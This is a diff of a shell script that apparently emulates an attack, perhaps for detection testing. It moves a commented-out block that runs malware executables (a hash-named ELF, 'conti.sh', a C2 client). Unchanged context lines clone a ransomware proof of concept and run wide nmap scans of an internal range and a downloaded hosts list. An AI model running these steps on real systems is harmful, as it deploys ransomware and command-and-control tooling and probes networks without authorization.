@@ -73,13 +73,6 @@ echo "[+] Changing C2 Client file permissions to executable"
 chmod +x c2.sh
 sleep 3
 
-# Execution of Malware (suppress errors with `|| true`)
-echo "[+] Calling malware executables"
-#[TODO] Error handeling in this - nil pointer reference in go library 
-#./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
-#./conti.sh || true 
-#./c2.sh || true 
-
 ## RANSOMWARE POC 
 git clone https://github.com/jimmy-ly00/Ransomware-PoC
 cd /Ransomware-POC 
@@ -201,5 +194,12 @@ nmap -p- 10.0.0.0/16 > localhost.txt
 echo "[+] Downloading hosts list and scanning"
 wget -O url2.txt https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv
 nmap -iL url2.txt
+
+# Execution of Malware (suppress errors with `|| true`)
+echo "[+] Calling malware executables"
+#[TODO] Error handeling in this - nil pointer reference in go library 
+#./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
+#./conti.sh || true 
+#./c2.sh || true 
 
 
